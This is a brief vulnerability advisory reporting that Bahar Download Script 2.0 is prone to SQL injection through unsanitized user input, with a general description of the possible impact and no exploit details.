Bahar Download Script is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data.

A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

Bahar Download Script 2.0 is vulnerable; other versions may also be affected.
